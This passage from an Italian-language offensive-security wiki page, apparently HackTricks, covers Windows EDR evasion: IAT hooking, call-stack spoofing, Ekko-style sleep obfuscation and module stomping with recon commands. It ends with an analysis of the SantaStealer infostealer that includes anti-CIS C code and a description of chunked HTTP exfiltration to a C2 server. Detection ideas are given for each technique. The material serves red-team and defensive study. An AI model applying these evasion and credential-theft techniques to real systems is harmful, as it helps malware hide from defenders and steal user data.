- Mantieni i wrapper minuscoli e PIC-safe; risolvi la vera API tramite il valore originale della IAT che hai catturato prima del patching oppure tramite `LdrGetProcedureAddress`.
- Usa transizioni RW → RX per PIC e evita di lasciare pagine writable+executable.

Call‑stack spoofing stub
- I PIC stub in stile Draugr costruiscono una fake call chain (return addresses in moduli benigni) e poi pivotano nella vera API.
- Questo aggira le detection che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbina stack cutting e stack stitching techniques per arrivare dentro frame attesi prima del prologue dell'API.

Operational integration
- Anteponi il reflective loader ai DLL post-ex così il PIC e gli hooks si inizializzano automaticamente quando il DLL viene caricato.
- Usa uno script Aggressor per registrare le target API così Beacon e BOFs beneficiano in modo trasparente dello stesso evasion path senza cambi di codice.

Detection/DFIR considerations
- IAT integrity: entry che risolvono verso indirizzi non-image (heap/anon); verifica periodica dei puntatori di import.
- Stack anomalies: return addresses che non appartengono a immagini caricate; transizioni improvvise verso PIC non-image; ancestry di `RtlUserThreadStart` incoerente.
- Loader telemetry: scritture in-process nella IAT, attività precoce di `DllMain` che modifica import thunks, regioni RX inattese create al load.
- Image-load evasion: se fai hooking di `LoadLibrary*`, monitora load sospetti di automation/clr assemblies correlati a eventi di memory masking.

Related building blocks and examples
- Reflective loaders che eseguono IAT patching durante il load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e PIC di stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Se controlli un reflective loader, puoi hookare gli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver custom che controlla prima gli hooks:

- Costruisci un **resident PICO** (persistent PIC object) che sopravvive dopo che il transient loader PIC libera se stesso.
- Esporta una funzione `setup_hooks()` che sovrascrive il resolver di import del loader (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, salta gli import per ordinal e usa una hook lookup basata su hash come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega alla vera `GetProcAddress`.
- Registra i target degli hook al link time con voci Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook resta valido perché vive dentro il resident PICO.

Questo produce **import-time IAT redirection** senza patchare la code section del DLL caricato dopo il load.

### Forcing hookable imports when the target uses PEB-walking

Gli import-time hooks si attivano solo se la funzione è davvero nella IAT del target. Se un modulo risolve le API via PEB-walk + hash (nessuna import entry), forza un import reale così il path `ProcessImports()` del loader lo vede:

- Sostituisci la resolution degli export hashati (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore emette una entry IAT, abilitando l'interception quando il reflective loader risolve gli import.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Invece di patchare `Sleep`, hooka le **vere primitive di wait/IPC** usate dall'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per wait lunghi, avvolgi la chiamata in una chain di obfuscation in stile Ekko che cripta l'immagine in memoria durante l'idle:

- Usa `CreateTimerQueueTimer` per schedulare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` costruiti ad hoc.
- Chain tipica (x64): imposta l'immagine a `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` sull'intera immagine mappata → esegui la wait bloccante → RC4 decrypt → **ripristina i permessi per sezione** scorrendo le sezioni PE → segnala completion.
- `RtlCaptureContext` fornisce un template `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni step.

Dettaglio operativo: restituisci “success” per wait lunghi (e.g., `WAIT_OBJECT_0`) così il chiamante continua mentre l'immagine è masked. Questo pattern nasconde il modulo dagli scanner durante le finestre di idle ed evita la classica signature “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Burst di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` usata su buffer grandi contigui della dimensione di un'immagine.
- `VirtualProtect` su range ampio seguito da ripristino custom dei permessi per sezione.


## Precision Module Stomping

Module stomping esegue payload dalla **sezione `.text` di un DLL già mappato dentro il processo target** invece di allocare memoria privata eseguibile ovvia o caricare un nuovo DLL sacrificabile. Il target da sovrascrivere dovrebbe essere un **immagine caricata, backing su disco** il cui code space possa assorbire il payload senza corrompere i code path che il processo usa ancora.

### Reliable target selection

Lo stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: il DLL potrebbe non essere caricato nel processo remoto, e una code region troppo piccola farà crashare il processo. Un workflow più affidabile è:

1. Enumera i moduli del processo target e mantieni una **names-only include list** dei DLL già caricati.
2. Costruisci prima il payload e registra la sua **esatta dimensione in byte**.
3. Scansiona i DLL candidati su disco e confronta il PE section **`.text` `Misc_VirtualSize`** con la dimensione del payload. Questo conta più della dimensione del file perché riflette la dimensione della sezione eseguibile **quando mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli un RVA di una funzione esportata come offset di inizio dello stomp.
5. Calcola il **blast radius**: se il payload supera il boundary della funzione selezionata, sovrascriverà export adiacenti disposti dopo di essa in memoria.

Tipici helper di recon/selection visti in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Note operative
- Preferisci DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti immagine inattesi.
- Preferisci export eseguiti raramente dall'applicazione target, altrimenti i normali code paths possono colpire i byte stomped prima o dopo la creazione del thread.
- Gli implant grandi spesso richiedono di cambiare l'embedding dello shellcode da una string literal a un **byte-array/braced initializer** così che l'intero buffer sia rappresentato correttamente nel source dell'injector.

Idee di detection
- Remote writes in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) invece delle più comuni allocazioni private RWX/RX.
- Export entry points i cui byte in memoria non corrispondono più al file di supporto su disco.
- Remote threads o context pivots che iniziano l'esecuzione dentro un export legittimo di una DLL i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` contro pagine `.text` di DLL seguite dalla creazione di thread.

## SantaStealer Tradecraft per Fileless Evasion e Credential Theft

SantaStealer (aka BluelineStealer) mostra come i moderni info-stealer combinano AV bypass, anti-analysis e credential access in un unico workflow.

### Keyboard layout gating & sandbox delay

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample rilascia un marker vuoto `CIS` e termina prima di eseguire gli stealer, garantendo che non si attivi mai su locali esclusi lasciando però un artefatto di hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- La Variant A esamina la lista dei processi, calcola l'hash di ogni nome con un checksum rolling custom e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla working directory come `C:\analysis`.
- La Variant B ispeziona le proprietà di sistema (process-count floor, recent uptime), chiama `OpenServiceA("VBoxGuest")` per rilevare aggiunte di VirtualBox e esegue controlli di timing attorno ai sleep per individuare single-stepping. Qualsiasi hit interrompe l'esecuzione prima del lancio dei modules.

### Fileless helper + double ChaCha20 reflective loading

- Il primary DLL/EXE incorpora un Chromium credential helper che viene rilasciato su disco o manualmente mapped in-memory; in fileless mode risolve da solo imports/relocations, quindi non vengono scritti helper artifacts.
- Quell'helper memorizza un second-stage DLL cifrato due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, lo carica reflective (senza `LoadLibrary`) e chiama gli exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Le routine di ChromElevator usano direct-syscall reflective process hollowing per iniettare in un browser Chromium attivo, ereditare le chiavi di AppBound Encryption e decifrare password/cookie/credit card direttamente dai database SQLite nonostante l'hardening ABE.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` itera una tabella globale di function-pointer `memory_generators` e avvia un thread per ogni module abilitato (Telegram, Discord, Steam, screenshots, documents, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e riporta il proprio file count dopo una finestra di join di ~45s.
- Una volta terminato, tutto viene zippato con la libreria staticamente linked `miniz` come `%TEMP%\\Log.zip`. `ThreadPayload1` poi dorme 15s e invia l'archivio in chunk da 10 MB via HTTP POST a `http://<C2>:6767/upload`, spoofando un boundary browser `multipart/form-data` (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, opzionale `w: <campaign_tag>`, e l'ultimo chunk aggiunge `complete: true` così il C2 sa che la riassemblaggio è completato.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
